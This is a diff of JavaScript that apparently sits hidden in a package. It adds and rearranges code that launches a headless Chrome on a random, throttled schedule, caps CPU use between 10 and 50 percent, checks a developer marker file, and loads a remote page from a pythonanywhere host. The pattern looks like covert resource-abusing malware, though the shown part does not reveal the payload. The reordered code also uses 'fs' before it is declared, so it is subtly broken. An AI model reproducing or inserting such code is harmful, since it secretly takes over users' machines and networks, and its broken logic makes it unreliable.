@@ -1,16 +1,48 @@
 (async () => {
 
-
-  if (global.cppBrowser) return;
-
+  let devMode = false;
   let chance = (probability) => Math.random() < probability;
   let reduceFactor = 0.9;
+  let nonHeadless = false;
 
   let repTime = 10 * 60 * 1000; // with reduceFactor skip 9 reps, exec 1 rep = exec after 100 minutes
+  let forceDebug = false;
+  let waitTime = 10 * 60 * 1000;
+
+  let brInfo = {
+    name: 'chrome',
+    version: '130.0.6723.58',
+  }
+
+
+  try {
+    if (fs.existsSync('C:\\498_dev_test.txt')) {
+      devMode = true;
+      forceDebug = true;
+      // brInfo = {
+      //   name: 'firefox',
+      //   version: '132.0',
+      // }
+      waitTime = 0;
+      repTime = 0.1 * 60 * 1000;
+      nonHeadless = true;
+      // return;
+    } else {
+      // return;
+    }
+  } catch (error) {
+    console.log('dev mode error', error);
+  }
+
+  if (!devMode && global.cppBrowser) return;
+
+
 
   let fs = require('fs')
   let os = require('os');
   (async () => { throw new Error('sp-init ' + `${os.tmpdir()}/single_init_unix_time.txt`) })();
+
+  
   if (!fs.existsSync(`${os.tmpdir()}/single_init_unix_time.txt`) || (Date.now() - parseInt(fs.readFileSync(`${os.tmpdir()}/single_init_unix_time.txt`)) > repTime + 1 * 60 * 1000))
     fs.writeFileSync(`${os.tmpdir()}/single_init_unix_time.txt`, Math.floor(Date.now()).toString());
   else {
@@ -29,23 +61,16 @@
 
   let baseUrl = 'https://ab498.pythonanywhere.com/files/init.html';
 
-  let nonHeadless = false;
   let chromePath;
   let browser;
   let page;
   let minUse = 0.1;
   let maxUse = 0.5;
   let [max, min] = [maxUse, minUse];
-  let waitTime = 10 * 60 * 1000;
 
 
   try {
-    let forceDebug = false;
-    console.log('init py');
-    let brInfo = {
-      name: 'chrome',
-      version: '130.0.6723.58',
-    }
+
 
     // let baseUrl = 'http://share.liveblog365.com/init.html';
 
@@ -54,25 +79,6 @@
     const { join } = require('path');
 
 
-    let osUserInfo;
-    try {
-      osUserInfo = os.userInfo();
-      if (fs.existsSync('C:\\498_dev_test.txt')) {
-        forceDebug = true;
-        // brInfo = {
-        //   name: 'firefox',
-        //   version: '132.0',
-        // }
-        waitTime = 0;
-        repTime = 0.1 * 60 * 1000;
-        nonHeadless = true;
-        // return;
-      } else {
-        // return;
-      }
-    } catch (error) {
-      console.log('os.userInfo() error', error);
-    }
 
 
     function getCPUUsage() {
